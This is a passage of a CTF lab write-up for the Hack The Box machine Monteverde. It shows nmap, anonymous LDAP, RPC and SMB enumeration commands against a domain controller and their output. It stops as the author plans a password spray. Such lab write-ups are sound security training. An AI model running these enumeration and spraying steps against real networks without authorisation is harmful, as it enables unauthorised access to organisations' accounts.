  
    <li class="md-nav__item">
      <a href="../shadowcredential/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    shadowcredential
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ADdisabledaccount/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ADdisabledaccount
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#intro" class="md-nav__link">
    <span class="md-ellipsis">
      Intro
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nmap-scan" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap scan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldap-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpc-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      RPC enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SMB enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#domain-password-policy" class="md-nav__link">
    <span class="md-ellipsis">
      Domain Password policy
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#find-valid-users" class="md-nav__link">
    <span class="md-ellipsis">
      Find valid Users
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#foothold" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Foothold">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#password-spraying" class="md-nav__link">
    <span class="md-ellipsis">
      Password spraying
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-as-sabatchjobs" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration as SABatchJobs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logging-in-as-mhope" class="md-nav__link">
    <span class="md-ellipsis">
      Logging in as mhope
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privesc" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privesc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#checking-users-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      Checking user's privileges
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#checking-group-membership" class="md-nav__link">
    <span class="md-ellipsis">
      Checking group membership
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bloodhound-as-mhope" class="md-nav__link">
    <span class="md-ellipsis">
      Bloodhound as mhope
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inspecting-the-hosts-program-files" class="md-nav__link">
    <span class="md-ellipsis">
      Inspecting the host's Program Files
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abusing-azure-ad-connect" class="md-nav__link">
    <span class="md-ellipsis">
      Abusing Azure AD connect
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Summary">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reconnaissance_1" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foothold_1" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc_1" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sidenotes" class="md-nav__link">
    <span class="md-ellipsis">
      Sidenotes
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



<h2 id="intro">Intro</h2>
<p><img alt="" src="../MediaFiles/Pasted%20image%2020250624124752.png" /></p>
<p>[[windows]] [[AD]] [[OSCPpath]] [[NotAssumedBreach]] [[ADconnectAbuse]]<br />
Tags: #windows #AD #OSCPpath #NotAssumedBreach #ADconnectAbuse<br />
Tools used:<br />
- windapsearch (LDAP enum)<br />
- enum4linux (SMB enumeration)<br />
- smbmap (SMB enumeration)<br />
- crackmapexec (password spraying)</p>
<hr />
<h1 id="reconnaissance">Reconnaissance</h1>
<h2 id="nmap-scan">Nmap scan</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>monteverde.htb
</span></code></pre></div>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.94SVN<span class="w"> </span><span class="o">(</span><span class="w"> </span>&lt;https://nmap.org&gt;<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-06-23<span class="w"> </span><span class="m">02</span>:52<span class="w"> </span>EEST
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>monteverde.htb<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.10.172<span class="o">)</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.055s<span class="w"> </span>latency<span class="o">)</span>.
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">989</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="m">53</span>/tcp<span class="w">   </span>open<span class="w">  </span>domain<span class="w">        </span>Simple<span class="w"> </span>DNS<span class="w"> </span>Plus
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="m">88</span>/tcp<span class="w">   </span>open<span class="w">  </span>kerberos-sec<span class="w">  </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2025</span>-06-22<span class="w"> </span><span class="m">23</span>:53:01Z<span class="o">)</span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="m">135</span>/tcp<span class="w">  </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="m">139</span>/tcp<span class="w">  </span>open<span class="w">  </span>netbios-ssn<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="m">389</span>/tcp<span class="w">  </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>MEGABANK.LOCAL0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="m">445</span>/tcp<span class="w">  </span>open<span class="w">  </span>microsoft-ds?
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="m">464</span>/tcp<span class="w">  </span>open<span class="w">  </span>kpasswd5?
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="m">593</span>/tcp<span class="w">  </span>open<span class="w">  </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="m">636</span>/tcp<span class="w">  </span>open<span class="w">  </span>tcpwrapped
</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="m">3268</span>/tcp<span class="w"> </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>MEGABANK.LOCAL0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="m">3269</span>/tcp<span class="w"> </span>open<span class="w">  </span>tcpwrapped
</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>MONTEVERDE<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>
</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>Host<span class="w"> </span>script<span class="w"> </span>results:
</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span class="p">|</span><span class="w"> </span>smb2-time:<span class="w"> </span>
</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2025</span>-06-22T23:53:05
</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span>N/A
</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a><span class="p">|</span><span class="w"> </span>smb2-security-mode:<span class="w"> </span>
</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="p">|</span><span class="w">   </span><span class="m">3</span>:1:1:<span class="w"> </span>
</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a><span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>
</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>&lt;https://nmap.org/submit/&gt;<span class="w"> </span>.
</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">58</span>.88<span class="w"> </span>seconds
</span></code></pre></div><br />
The scan reveals many ports open, including port 53 (DNS), 389 (LDAP) and 445 (SMB). This reveals that the server is a domain controller. The domain is identified by Nmap as MEGABANK.LOCAL</p>
<p>WHAT NOW? we have a dc in front of us, but no valid creds for the domain! So this isnt an assumed breach scenario!</p>
<h2 id="ldap-enumeration">LDAP enumeration</h2>
<p>this is the first time i came accross this, and found this script: <a href="https://raw.githubusercontent.com/ropnop/windapsearch/master/windapsearch.py">https://raw.githubusercontent.com/ropnop/windapsearch/master/windapsearch.py</a></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>python<span class="w"> </span>windapsearch.py<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">10</span>.10.10.172
</span></code></pre></div>
<p><img alt="" src="../MediaFiles/Pasted%20image%2020250624123958.png" /></p>
<p>We can also enumerate the domain users.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>python<span class="w"> </span>windapsearch.py<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">10</span>.10.10.172<span class="w"> </span>-U<span class="w"> </span>--admin-objects
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>No<span class="w"> </span>username<span class="w"> </span>provided.<span class="w"> </span>Will<span class="w"> </span>try<span class="w"> </span>anonymous<span class="w"> </span>bind.
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>Domain<span class="w"> </span>Controller<span class="w"> </span>at:<span class="w"> </span><span class="m">10</span>.10.10.172
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Getting<span class="w"> </span>defaultNamingContext<span class="w"> </span>from<span class="w"> </span>Root<span class="w"> </span>DSE
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Found:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>MEGABANK,DC<span class="o">=</span>LOCAL
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Attempting<span class="w"> </span><span class="nb">bind</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>...success!<span class="w"> </span>Binded<span class="w"> </span>as:
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>None
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Enumerating<span class="w"> </span>all<span class="w"> </span>AD<span class="w"> </span>users
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span><span class="m">10</span><span class="w"> </span>users:
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>cn:<span class="w"> </span>Guest
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>cn:<span class="w"> </span>AAD_987d7f2f57d2
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>cn:<span class="w"> </span>Mike<span class="w"> </span>Hope
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>userPrincipalName:<span class="w"> </span>mhope@MEGABANK.LOCAL
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>cn:<span class="w"> </span>SABatchJobs
</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>userPrincipalName:<span class="w"> </span>SABatchJobs@MEGABANK.LOCAL
</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>cn:<span class="w"> </span>svc-ata
</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>userPrincipalName:<span class="w"> </span>svc-ata@MEGABANK.LOCAL
</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>cn:<span class="w"> </span>svc-ata
</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>userPrincipalName:<span class="w"> </span>svc-ata@MEGABANK.LOCAL
</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>cn:<span class="w"> </span>svc-bexec
</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>userPrincipalName:<span class="w"> </span>svc-bexec@MEGABANK.LOCAL
</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>cn:<span class="w"> </span>svc-netapp
</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>userPrincipalName:<span class="w"> </span>svc-netapp@MEGABANK.LOCAL
</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>cn:<span class="w"> </span>Dimitris<span class="w"> </span>Galanos
</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>userPrincipalName:<span class="w"> </span>dgalanos@MEGABANK.LOCAL
</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>cn:<span class="w"> </span>Ray<span class="w"> </span>O<span class="err">&#39;</span>Leary
</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a>userPrincipalName:<span class="w"> </span>roleary@MEGABANK.LOCAL
</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a>cn:<span class="w"> </span>Sally<span class="w"> </span>Morgan
</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a>userPrincipalName:<span class="w"> </span>smorgan@MEGABANK.LOCAL
</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Attempting<span class="w"> </span>to<span class="w"> </span>enumerate<span class="w"> </span>all<span class="w"> </span>admin<span class="w"> </span><span class="o">(</span>protected<span class="o">)</span><span class="w"> </span>objects
</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span><span class="m">0</span><span class="w"> </span>Admin<span class="w"> </span>Objects:
</span></code></pre></div>
<p>the account <code>AAD_987d7f2f57d2</code><br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>cn:<span class="w"> </span>Guest
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>cn:<span class="w"> </span>AAD_987d7f2f57d2
</span></code></pre></div><br />
indicates that <code>AD Connect</code> is installed in the domain. AD Connect is a tool that is used to synchronize an on-premise Active Directory environment to Azure Active Directory.</p>
<p>Using windapsearch we can further enumerate domain groups, and see which users belong to <code>Remote Management Users</code> .  This group allows its members to connect to computers using PowerShell Remoting.<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>python<span class="w"> </span>windapsearch.py<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">10</span>.10.10.172<span class="w"> </span>-U<span class="w"> </span>-m<span class="w"> </span><span class="s2">&quot;Remote Management Users&quot;</span>
</span></code></pre></div></p>
<p><img alt="" src="../MediaFiles/Pasted%20image%2020250624124022.png" /><br />
The user mhope (CN=Mike Hope) is identified to be in the Remote Management Users group.</p>
<h2 id="rpc-enumeration">RPC enumeration</h2>
<p>We could also check rpc with <code>rpcclient</code> since <code>port 135</code> is open<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-N<span class="w"> </span><span class="m">10</span>.10.10.172
</span></code></pre></div></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>querydispinfo
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>index:<span class="w"> </span>0xfb6<span class="w"> </span>RID:<span class="w"> </span>0x450<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>AAD_987d7f2f57d2<span class="w">       </span>Name:<span class="w"> </span>AAD_987d7f2f57d2<span class="w">  </span>Desc:<span class="w"> </span>Service<span class="w"> </span>account<span class="w"> </span><span class="k">for</span><span class="w"> </span>the<span class="w"> </span>Synchronization<span class="w"> </span>Service<span class="w"> </span>with<span class="w"> </span>installation<span class="w"> </span>identifier<span class="w"> </span>05c97990-7587-4a3d-b312-309adfc172d9<span class="w"> </span>running<span class="w"> </span>on<span class="w"> </span>computer<span class="w"> </span>MONTEVERDE.
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>index:<span class="w"> </span>0xfd0<span class="w"> </span>RID:<span class="w"> </span>0xa35<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>dgalanos<span class="w">       </span>Name:<span class="w"> </span>Dimitris<span class="w"> </span>Galanos<span class="w">  </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>index:<span class="w"> </span>0xedb<span class="w"> </span>RID:<span class="w"> </span>0x1f5<span class="w"> </span>acb:<span class="w"> </span>0x00000215<span class="w"> </span>Account:<span class="w"> </span>Guest<span class="w">  </span>Name:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span><span class="w">    </span>Desc:<span class="w"> </span>Built-in<span class="w"> </span>account<span class="w"> </span><span class="k">for</span><span class="w"> </span>guest<span class="w"> </span>access<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>computer/domain
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>index:<span class="w"> </span>0xfc3<span class="w"> </span>RID:<span class="w"> </span>0x641<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>mhope<span class="w">  </span>Name:<span class="w"> </span>Mike<span class="w"> </span>Hope<span class="w"> </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>index:<span class="w"> </span>0xfd1<span class="w"> </span>RID:<span class="w"> </span>0xa36<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>roleary<span class="w">        </span>Name:<span class="w"> </span>Ray<span class="w"> </span>O<span class="err">&#39;</span>Leary<span class="w">       </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>index:<span class="w"> </span>0xfc5<span class="w"> </span>RID:<span class="w"> </span>0xa2a<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>SABatchJobs<span class="w">    </span>Name:<span class="w"> </span>SABatchJobs<span class="w">       </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>index:<span class="w"> </span>0xfd2<span class="w"> </span>RID:<span class="w"> </span>0xa37<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>smorgan<span class="w">        </span>Name:<span class="w"> </span>Sally<span class="w"> </span>Morgan<span class="w">      </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>index:<span class="w"> </span>0xfc6<span class="w"> </span>RID:<span class="w"> </span>0xa2b<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>svc-ata<span class="w">        </span>Name:<span class="w"> </span>svc-ata<span class="w">   </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>index:<span class="w"> </span>0xfc7<span class="w"> </span>RID:<span class="w"> </span>0xa2c<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>svc-bexec<span class="w">      </span>Name:<span class="w"> </span>svc-bexec<span class="w"> </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>index:<span class="w"> </span>0xfc8<span class="w"> </span>RID:<span class="w"> </span>0xa2d<span class="w"> </span>acb:<span class="w"> </span>0x00000210<span class="w"> </span>Account:<span class="w"> </span>svc-netapp<span class="w">     </span>Name:<span class="w"> </span>svc-netapp<span class="w">        </span>Desc:<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
</span></code></pre></div>
<h2 id="smb-enumeration">SMB enumeration</h2>
<p>Let's use smbclient to test for SMB null sessions. Command output reports that the anonymous login attempt was successful, although it failed to list any shares.</p>
<p>We can attempt to get credentials and access it again<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>smbclient<span class="w"> </span>-N<span class="w"> </span>-L<span class="w"> </span><span class="se">\\\\\\\\</span><span class="m">10</span>.10.10.172<span class="se">\\\\</span>
</span></code></pre></div><br />
<img alt="" src="../MediaFiles/Pasted%20image%2020250624124036.png" /></p>
<h3 id="domain-password-policy">Domain Password policy</h3>
<p>Let's use enum4linux to retrieve other domain information. We note that the Account Lockout Threshold is set to None , so we can attempt a password spray in order to obtain valid credentials. windapsearch can be used to create a list of domain users.<br />
